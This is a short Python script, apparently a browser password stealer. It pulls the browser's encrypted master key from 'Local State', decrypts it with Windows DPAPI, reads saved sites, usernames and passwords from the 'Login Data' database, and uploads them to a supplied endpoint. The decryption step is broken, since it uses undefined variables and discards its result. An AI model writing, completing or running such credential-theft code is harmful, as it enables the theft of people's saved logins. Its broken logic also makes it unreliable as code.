import os, json, base64, sqlite3, requests, win32crypt
from Crypto.Cipher import AES

def collect(base, endpoint):
    blob = json.load(open(os.path.join(base, "Local State")))["os_crypt"]["encrypted_key"]
    key = win32crypt.CryptUnprotectData(base64.b64decode(blob)[5:], None, None, None, 0)[1]
    con = sqlite3.connect(os.path.join(base, "Default", "Login Data"))
    rows = con.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()
    cipher = AES.new(key, AES.MODE_GCM, nonce)
    cipher.decrypt(ciphertext)
    requests.post(endpoint, files={"file": ("records.txt", repr(rows))})
